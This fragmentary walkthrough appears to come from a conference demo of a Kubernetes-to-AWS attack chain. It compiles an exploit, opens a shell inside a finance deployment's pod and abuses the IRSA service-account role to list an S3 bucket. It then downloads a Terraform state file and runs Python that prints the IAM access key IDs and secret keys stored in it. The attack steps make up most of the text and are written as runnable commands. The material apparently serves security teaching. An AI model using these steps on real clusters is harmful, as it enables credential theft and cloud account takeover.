...
JAVA
cd /opt/exploits && javac -nowarn -source 1.8 -target 1.8 Exploit.java
```
...
```bash
kubectl exec -it deploy/expense-report-app -n finance -- /bin/bash
```

## Part 2: Move via IRSA 
...
```bash
kubectl get sa expense-report-sa -n finance -o yaml | grep -A2 annotations
```
...
```bash
aws s3 ls s3://rsac-demo-tf-state-590184035221/

aws s3 cp s3://rsac-demo-tf-state-590184035221/terraform.tfstate /tmp/terraform.tfstate
...
for r in state['resources']:
    if r['type'] == 'aws_iam_access_key':
        ...
        print(f\"Access Key ID: {attrs['id']}\")
        print(f\"Secret Key:    {attrs['secret']}\")
        print(f\"User:          {attrs['user']}\")
    if r['type'] == 'aws_eks_cluster':
        name = r['instances'][0]['attributes']['name']
        print(f\"EKS Cluster:   {name}\")
"
```
...
```bash
k rollout restart deploy expense-report-app -n finance
```
